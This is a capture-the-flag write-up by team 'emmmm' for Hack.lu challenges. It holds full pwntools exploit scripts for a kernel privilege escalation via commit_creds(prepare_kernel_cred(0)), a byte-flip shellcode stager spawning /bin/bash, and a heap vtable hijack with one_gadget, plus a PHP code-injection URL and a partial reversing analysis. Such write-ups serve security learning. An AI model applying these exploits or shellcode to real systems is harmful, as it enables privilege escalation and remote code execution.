## Hack.lu Writeups by emmmm
> emmmm, we are team based on USTC&BUPT&HIT&M4x
## PWN
### Baby Kernel
This is a simple kernel pwn challenge. We are able to call some function with
arguments. And there is no KASLR from hints. So we call
`commit_creds(prepare_kernel_cred(0))` to get root then we can read flag.
    babykernel bat solve.py 
    ───────┬─────────────────────────────────────────────────────────────────────────────────────────────────────────
           │ File: solve.py
    ───────┼─────────────────────────────────────────────────────────────────────────────────────────────────────────
       1   │ #!/usr/bin/env python
       2   │ # -*- coding: utf-8 -*-       3   │ 
       4   │ from pwn import *
       5   │ 
       6   │ vmlinux = ELF("./vmlinux", checksec = False)
       7   │ 
       8   │ pkc = vmlinux.sym['prepare_kernel_cred']
       9   │ print "pkc: ", pkc
      10   │ cc = vmlinux.sym['commit_creds']
      11   │ print "cc: ", cc
    ───────┴─────────────────────────────────────────────────────────────────────────────────────────────────────────
    babykernel python solve.py 
    pkc:  18446744071579168336
    cc:  18446744071579167184
    ----- Menu -----    1. Call
    2. Show me my uid
    3. Read file
    4. Any hintz?
    5. Bye!
    > 2
    uid=1000(user) gid=1000(user) groups=1000(user)
    ----- Menu -----    1. Call
    2. Show me my uid
    3. Read file
    4. Any hintz?
    random: fast init done
    5. Bye!
    > 1
    I need a kernel address to call. Be careful, though or .
    > 
    18446744071579168336
    There is a good chance we will want to pass an argument?
    > 
    0
    Got call address: 0xffffffff8104ee50, argument: 0x000000
    flux_baby ioctl nr 900 called
    flux_baby ioctl nr 900 called
    flux_baby ioctl extracted param ffffffff8104ee50 as funt
    A miracle happened. We came back without crashing! I ev.
    It is: ffff88000212c0c0
    ----- Menu -----    1. Call
    2. Show me my uid
    3. Read file
    4. Any hintz?
    5. Bye!
    > 1
    I need a kernel address to call. Be careful, though or .
    > 
    18446744071579167184
    There is a good chance we will want to pass an argument?
    > 
    18446612132349001920 
    Got call address: 0xffffffff8104e9d0, argument: 0xffff80
    flux_baby ioctl nr 900 called
    flux_baby ioctl nr 900 called
    flux_baby ioctl extracted param ffffffff8104e9d0 as funt
    A miracle happened. We came back without crashing! I ev.
    It is: 0000000000000000
    ----- Menu -----    1. Call
    2. Show me my uid
    3. Read file
    4. Any hintz?
    5. Bye!
    > 2
    uid=0(root) gid=0(root)
    ----- Menu -----    1. Call
    2. Show me my uid
    3. Read file
    4. Any hintz?
    5. Bye!
    > 3
    Which file are we trying to read?
    > /flag
    Here are your 0xf bytes contents: 
    flag{testflag}
### baby exploit
modify the jump offset to input， and we can control 7 bytes, so we first use 7
byte to make a read syscall to read the shellcode , and then jump to the
shellcode.
    from pwn import *
    context.arch = 'amd64'
    sc = "\xeb\x0b\x5f\x48\x31\xd2\x52\x5e\x6a\x3b\x58\x0f\x05\xe8\xf0\xff\xff\xff\x2f\x2f\x2f\x2f\x62\x69\x6e\x2f\x2f\x2f\x2f\x62\x61\x73\x68\x00"
    def decrypt(s):
        sc_list = map(ord, list(s))
        for i in range(len(sc_list) - 2, -1, -1):
          sc_list[i] = sc_list[i+1] ^ sc_list[i]
        sc =  eval(repr(''.join(map(chr, sc_list))))
        return sc
    # io = process('./chall')
    # io = process('./modified')
    io = remote("arcade.fluxfingers.net", 1807)
    io.recvuntil("want to flip")
    io.sendline("0xbc")
    io.recvuntil("byte-offset")
    io.sendline("3")
    io.recvuntil("win:")
    asm_code = '''
    pop rax
    pop rdx
    pop rax
    xor edi, edi
    syscall
    '''
    code = asm(asm_code)
    log.info(code +  "length: " + str(len(code)))
    payload = decrypt('a'*(0x2e - 7) + code)
    payload2 = 'aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa' + sc
    # sleep(0.5)
    io.send(payload)
    sleep(0.5)
    io.sendline(payload2)
    io.interactive()
### heap_heaven_2
The program mmap a heap whose size is 0x2000, and it provide some choices that
we can do on the heap, such as write some bytes on it, free some of it into
tcache or bins(need to use write choice to fake heap on it) and choose a
offset on the heap and get the value as a point to print(need to write first
also). And the program malloc a heap called state and place a vtable point in
it(`*state = vtable`), the vatble has two function point, one is menu, the
other is bye(`*vtable=&bye,*(vtable+8)=&menu`), menu function is called every
time the loop.
After know that, we can easily leak the address of libc、heap and the mmaped
heap by faking some heap and free them into fastbin and unsortbin(i didn't do
them by using tcache because my local environment dosen't have tcache).
The free choice dosen't check the address is within the mmaped heap or not. So
we can free arbitrary address, our target is state, state is a fastbin of size
0x20，we can hijack state->fd point to a fake heap we free into fastbin before
it, vtable places in state->fd, and i pce one_gadget in the fake heap. After
that, when the program call menu `*((state->vtable)+8)()`, it will call
one_gadget.
    from pwn import*
    def write_heap(length, offset, data):
        p.recvuntil("[5] : exit\n")
        p.sendline("1")
        p.recvuntil("How much do you want to write?\n")
        p.sendline(str(length))
        p.recvuntil("At which offset?")
        p.sendline(str(offset))
        sleep(1)
        p.send(data)
    def free_heap(offset):
        p.recvuntil("[5] : exit\n")
        p.sendline("3")
        p.recvuntil("At which offset do you want to free?\n")
        p.sendline(str(offset))
    def leak_heap(offset):
        p.recvuntil("[5] : exit\n")
        p.sendline("4")
        p.recvuntil("At which offset do you want to leak?\n")
        p.sendline(str(offset))
        p.recvuntil("a"*16)
        addr = u64(p.recv(6).ljust(8,'\x00'))
        return addr
    def leak_heap1(offset):
        p.recvuntil("[5] : exit\n")
        p.sendline("4")
        p.recvuntil("At which offset do you want to leak?\n")
        p.sendline(str(offset))
        addr = u64(p.recv(6).ljust(8,'\x00'))
        return addr
    #p = process("./heap_heaven_2")
    p = remote("arcade.fluxfingers.net",1809)
    x = (p64(0x00) + p64(0x21) + "2"*0x10 + p64(0x00) + p64(0x91) + "1"*0x80)*8
    write_heap(len(x),0x1000,x)
    free_heap(0x1000+0x10)
    free_heap(0x1000+0x10+0xb0)
    free_heap(0x1000+0x10+0xb0*2)
    free_heap(0x1000+0x10+0xb0*3)
    free_heap(0x1000+0x10+0xb0*4)
    free_heap(0x1000+0x10+0xb0*5)
    free_heap(0x1000+0x10+0xb0*6)
    heap1 = p64(0x00) + p64(0x21) + "1"*0x10
    heap2 = p64(0x00) + p64(0x21) + "2"*0x10 
    heap3 = p64(0x00) + p64(0x421) + "3"*0x410
    heap4 = p64(0x00) + p64(0x21) + "4"*0x10
    heap5 = p64(0x00) + p64(0x21) + "5"*0x10
    heap6 = p64(0x00) + p64(0x31) + "6"*0x20
    data1 = heap1 + heap2 + heap3 + heap4 + heap5 + heap6
    data2 = "a"*16
    write_heap(len(data1),0,data1)
    write_heap(len(data1),0x800,data1)
    write_heap(len(data1),0x1800,data1)
    free_heap(0x1800 + len(heap1) + 0x10)   #heap2
    free_heap(0x1800 + len(heap1 + heap2 + heap3) + 0x10) #heap4
    free_heap(0x1800 + len(heap1 + heap2 + heap3 + heap4) + 0x10)#heap5
    write_heap(len(data2),0x1800+len(heap1 + heap2 + heap3),data2)
    mmap = leak_heap(0x1800 + len(heap1 + heap2 + heap3 + heap4) + 0x10) & 0xFFFFFFFFFF
    mmap -= len(heap1)
    mmap -= 0x1800
    print "mmap: " + hex(mmap)
    free_heap(len(heap1 + heap2) + 0x10)#heap3
    addr2 = leak_heap1(len(heap1 + heap2) + 0x10)
    heap = addr2 - 0x290
    print "heap: " + hex(heap)
    free_heap(len(heap1 + heap2) + 0x10 + 0x800)
    write_heap(17,len(heap1 + heap2),"a"*17)
    addr1 = leak_heap(len(heap1 + heap2) + 0x10 + 0x800) &0xffffffffff00
    libc = addr1 - 0x01BEB00
    one = 0xe75f0
    one += libc
    print "libc:" + hex(libc)
    write_heap(len(p64(heap+0x290-0x10)),0x700,p64(heap+0x290-0x10))
    func = leak_heap1(0x700)
    print hex(func)
    write_heap(len(p64(one))*2,0x1800 + len(heap1 + heap2 + heap3 + heap4),(p64(one)*2))
    target = heap + 0x290 -0x30
    free_heap(target - mmap)
    p.interactive()
## WEB
### babyphp
>
> [https://arcade.fluxfingers.net:1819/?msg=data:text/plain;base64,SGVsbG8gQ2hhbGxlbmdlIQ==&key1=1337x&key2=000000000000000000000000000000000001337%EF%BC%84&cc[]=emmm&k1=2&bb=var_dump($flag);//](https://arcade.fluxfingers.net:1819/?msg=data:text/plain;base64,SGVsbG8gQ2hhbGxlbmdlIQ==&key1=1337x&key2=000000000000000000000000000000000001337%EF%BC%84&cc\[\]=emmm&k1=2&bb=var_dump\($flag\);//)  
>  flag{7c217708c5293a3264bb136ef1fadd6e}
## REVERSE
### 1-bit-missile
We know that it is a `bios rom` from the result of `strings ./rom`.
So we run it using `qemu-system-i386 -nographic -bios ./rom` and debugging
with `qemu-system-i386 -nographic -bios ./rom -s -S`.
After attaching to the rom, we're able to dump the code in gdb using `dump
binary memory dump.bin 0x100000 0xffffff`
> we know the start address is 0x100000 because " _Jumping to boot code at
> 00100000(07fd7000)_ "
Then we open dump.bin with IDA and rebase it to 0x100000. After searching
strings, we find an interesting function like:
    void __cdecl __noreturn sub_10009E(char a1)
    {
      char *a1a; // [esp+4h] [ebp-14h]
      print("FLAG if hit confirmed:");
      if ( (unsigned int)(data[19] ^ data[24])  data[33] )
      {
        print("address out of scope!");
        sub_100160();